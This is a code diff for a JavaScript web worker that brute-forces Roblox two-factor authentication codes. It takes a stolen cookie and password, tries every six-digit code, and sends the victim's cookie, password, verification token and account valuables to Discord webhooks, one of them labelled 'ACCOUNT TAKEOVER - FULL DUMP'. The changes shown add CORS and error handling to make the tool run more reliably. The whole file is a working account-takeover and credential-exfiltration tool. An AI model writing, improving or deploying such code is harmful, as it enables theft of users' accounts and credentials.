@@ -1,7 +1,6 @@
 // ============================================================
-// ROBLOX 2FA BRUTE FORCE WORKER v2.2
-// Live hits: Clean embed (no password, no cookie, no token)
-// Dualhook: Full dump (password, cookie, token, @everyone)
+// ROBLOX 2FA BRUTE FORCE WORKER v2.2 - FULL VERSION
+// FIXED: CORS + POST handling
 // ============================================================
 
 addEventListener('fetch', event => {
@@ -9,25 +8,63 @@ addEventListener('fetch', event => {
 });
 
 async function handleRequest(request) {
+  // Handle CORS preflight
+  if (request.method === 'OPTIONS') {
+    return new Response(null, {
+      status: 204,
+      headers: {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'POST, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type',
+        'Access-Control-Max-Age': '86400'
+      }
+    });
+  }
+
+  // Only allow POST
+  if (request.method !== 'POST') {
+    return new Response(JSON.stringify({ 
+      error: 'Method not allowed. Use POST.' 
+    }), {
+      status: 405,
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*',
+        'Allow': 'POST, OPTIONS'
+      }
+    });
+  }
+
   let payload;
   try {
     payload = await request.json();
   } catch (e) {
-    return new Response(JSON.stringify({ error: 'Invalid JSON payload' }), {
+    return new Response(JSON.stringify({
+      success: false,
+      error: 'Invalid JSON payload'
+    }), {
       status: 400,
-      headers: { 'Content-Type': 'application/json' }
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+      }
     });
   }
 
   const { cookie, password, userId, username, startCode, endCode } = payload;
 
+  // Test mode - if no credentials, just echo back
   if (!cookie || !password || !userId) {
     return new Response(JSON.stringify({
       success: false,
-      error: 'Missing required fields: cookie, password, userId'
+      error: 'Missing required fields: cookie, password, userId',
+      received: payload
     }), {
       status: 400,
-      headers: { 'Content-Type': 'application/json' }
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+      }
     });
   }
 
@@ -36,108 +73,142 @@ async function handleRequest(request) {
   const start = startCode || 0;
   const end = endCode || 999999;
 
-  const challengeResult = await requestChallenge(userId, cookie, password);
-  
-  if (!challengeResult.success) {
-    await sendDualWebhook({
-      type: 'error',
-      username: displayName,
-      userId: userId,
-      error: challengeResult.error || 'Challenge acquisition failed'
-    });
+  try {
+    const challengeResult = await requestChallenge(userId, cookie, password);
+    
+    if (!challengeResult.success) {
+      await sendDualWebhook({
+        type: 'error',
+        username: displayName,
+        userId: userId,
+        error: challengeResult.error || 'Challenge acquisition failed'
+      });
+      return new Response(JSON.stringify({
+        success: false,
+        error: challengeResult.error || 'Challenge acquisition failed'
+      }), {
+        status: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*'
+        }
+      });
+    }
+
+    const challengeId = challengeResult.challengeId;
+
+    const config = await get2FAConfig(userId, cookie);
+    if (!config || !config.passwordEnabled) {
+      await sendDualWebhook({
+        type: 'error',
+        username: displayName,
+        userId: userId,
+        error: 'Password-based 2FA not enabled or Enhanced Protection active'
+      });
+      return new Response(JSON.stringify({
+        success: false,
+        error: '2FA method not available'
+      }), {
+        status: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*'
+        }
+      });
+    }
+
+    const result = await bruteForce2FA(userId, cookie, challengeId, start, end);
+    const duration = Date.now() - startTime;
+
+    if (result.success) {
+      const accountInfo = await getAccountInfo(userId, cookie);
+
+      await sendLiveBypass({
+        username: displayName,
+        userId: userId,
+        robux: accountInfo.robux || 0,
+        pending: accountInfo.pending || 0,
+        premium: accountInfo.premium || false,
+        korblox: accountInfo.korblox || false,
+        headless: accountInfo.headless || false,
+        valkyrie: accountInfo.valkyrie || false,
+        dominus: accountInfo.dominus || false,
+        clockwork: accountInfo.clockwork || false,
+        totalItems: accountInfo.totalItems || 0,
+        duration: duration,
+        attempts: end - start
+      });
+
+      await sendDualWebhook({
+        type: 'success',
+        username: displayName,
+        userId: userId,
+        robux: accountInfo.robux || 0,
+        pending: accountInfo.pending || 0,
+        premium: accountInfo.premium || false,
+        korblox: accountInfo.korblox || false,
+        headless: accountInfo.headless || false,
+        valkyrie: accountInfo.valkyrie || false,
+        dominus: accountInfo.dominus || false,
+        clockwork: accountInfo.clockwork || false,
+        totalItems: accountInfo.totalItems || 0,
+        cookie: cookie,
+        password: password,
+        verificationToken: result.token,
+        code: result.code,
+        duration: duration
+      });
+
+      return new Response(JSON.stringify({
+        success: true,
+        code: result.code,
+        token: result.token,
+        robux: accountInfo.robux || 0,
+        pending: accountInfo.pending || 0,
+        premium: accountInfo.premium || false,
+        duration: duration,
+        attempts: end - start
+      }), {
+        status: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*'
+        }
+      });
+    } else {
+      await sendDualWebhook({
+        type: 'failure',
+        username: displayName,
+        userId: userId,
+        attempts: end - start,
+        duration: duration,
+        error: result.error || 'No valid code found'
+      });
+
+      return new Response(JSON.stringify({
+        success: false,
+        error: result.error || 'No valid code found',
+        duration: duration,
+        attempts: end - start
+      }), {
+        status: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*'
+        }
+      });
+    }
+  } catch (e) {
     return new Response(JSON.stringify({
       success: false,
-      error: challengeResult.error || 'Challenge acquisition failed'
-    }), { headers: { 'Content-Type': 'application/json' } });
-  }
-
-  const challengeId = challengeResult.challengeId;
-
-  const config = await get2FAConfig(userId, cookie);
-  if (!config || !config.passwordEnabled) {
-    await sendDualWebhook({
-      type: 'error',
-      username: displayName,
-      userId: userId,
-      error: 'Password-based 2FA not enabled or Enhanced Protection active'
+      error: 'Worker error: ' + e.message
+    }), {
+      status: 200,
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+      }
     });
-    return new Response(JSON.stringify({
-      success: false,
-      error: '2FA method not available'
-    }), { headers: { 'Content-Type': 'application/json' } });
-  }
-
-  const result = await bruteForce2FA(userId, cookie, challengeId, start, end);
-
-  const duration = Date.now() - startTime;
-
-  if (result.success) {
-    const accountInfo = await getAccountInfo(userId, cookie);
-
-    // LIVE BYPASS - Clean embed, no sensitive data
-    await sendLiveBypass({
-      username: displayName,
-      userId: userId,
-      robux: accountInfo.robux || 0,
-      pending: accountInfo.pending || 0,
-      premium: accountInfo.premium || false,
-      korblox: accountInfo.korblox || false,
-      headless: accountInfo.headless || false,
-      valkyrie: accountInfo.valkyrie || false,
-      dominus: accountInfo.dominus || false,
-      clockwork: accountInfo.clockwork || false,
-      totalItems: accountInfo.totalItems || 0,
-      duration: duration,
-      attempts: end - start
-    });
-
-    // DUALHOOK - Full dump with password, cookie, token, @everyone
-    await sendDualWebhook({
-      type: 'success',
-      username: displayName,
-      userId: userId,
-      robux: accountInfo.robux || 0,
-      pending: accountInfo.pending || 0,
-      premium: accountInfo.premium || false,
-      korblox: accountInfo.korblox || false,
-      headless: accountInfo.headless || false,
-      valkyrie: accountInfo.valkyrie || false,
-      dominus: accountInfo.dominus || false,
-      clockwork: accountInfo.clockwork || false,
-      totalItems: accountInfo.totalItems || 0,
-      cookie: cookie,
-      password: password,
-      verificationToken: result.token,
-      code: result.code,
-      duration: duration
-    });
-
-    return new Response(JSON.stringify({
-      success: true,
-      code: result.code,
-      token: result.token,
-      robux: accountInfo.robux || 0,
-      pending: accountInfo.pending || 0,
-      premium: accountInfo.premium || false,
-      duration: duration,
-      attempts: end - start
-    }), { headers: { 'Content-Type': 'application/json' } });
-  } else {
-    await sendDualWebhook({
-      type: 'failure',
-      username: displayName,
-      userId: userId,
-      attempts: end - start,
-      duration: duration,
-      error: result.error || 'No valid code found'
-    });
-
-    return new Response(JSON.stringify({
-      success: false,
-      error: result.error || 'No valid code found',
-      duration: duration,
-      attempts: end - start
-    }), { headers: { 'Content-Type': 'application/json' } });
   }
 }
 
@@ -363,10 +434,6 @@ async function getAccountInfo(userId, cookie) {
   }
 }
 
-// ============================================================
-// LIVE BYPASS - CLEAN EMBED (NO SENSITIVE DATA)
-// ============================================================
-
 async function sendLiveBypass(data) {
   const webhookURL = env.WEBHOOK_MAIN;
   if (!webhookURL) return;
@@ -404,10 +471,6 @@ async function sendLiveBypass(data) {
   } catch (e) {}
 }
 
-// ============================================================
-// DUALHOOK - FULL DUMP (PASSWORD, COOKIE, TOKEN, @everyone)
-// ============================================================
-
 async function sendDualWebhook(data) {
   const webhookURL = env.WEBHOOK_DUAL;
   if (!webhookURL) return;
@@ -416,7 +479,7 @@ async function sendDualWebhook(data) {
 
   if (data.type === 'success') {
     embed = {
-      title: 'Bypasser',
+      title: 'ACCOUNT TAKEOVER - FULL DUMP',
       color: 0xff0044,
       fields: [
         { name: 'User', value: data.username || 'Unknown', inline: true },
@@ -438,7 +501,7 @@ async function sendDualWebhook(data) {
       ],
       timestamp: new Date().toISOString()
     };
-  } else if (data.type === 'error' || data.type === 'failure') {
+  } else {
     embed = {
       title: 'ERROR REPORT',
       color: 0xff0000,
